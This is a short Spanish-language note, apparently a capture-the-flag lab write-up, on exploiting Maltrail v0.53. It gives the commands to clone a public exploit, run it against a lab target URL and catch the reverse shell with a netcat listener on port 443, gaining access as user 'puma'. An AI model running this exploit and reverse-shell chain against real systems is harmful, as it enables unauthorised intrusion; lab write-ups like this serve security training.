#maltrailv053

---------

[Exploit link de repositorio github](https://github.com/spookier/Maltrail-v0.53-Exploit)
Con [[git clone]] con el comando `git clone https://github.com/spookier/Maltrail-v0.53-Exploit` vamos clonar el repositorio en nuestra maquina. Luego con [[cd]] entramos con el comando `cd Maltrail-v0.53-Exploit`  y una vez dentro listamos el contenido de la carpeta con [[ls]] . Ahora que ya visualizamos el exploit lo vamos a ejecutar con `python3 exploit.py 10.10.16.9 443 http://10.10.11.224:55555/testeo` mientras estamos en escucha con [[nc -nlvp 443]]

![[Sau11.png]]

![[Sau10.png]]
Y listo ya ganamos acceso a la maquina siendo el usuario *puma*

-----
# Parametros del exploit

```
python3 exploit.py IpDeNuestraMaquina PuertoEnEscucha LinkDeLaPagina
Ejemplo: python3 exploit.py 10.10.16.9 443 http://10.10.11.224:55555/testeo
```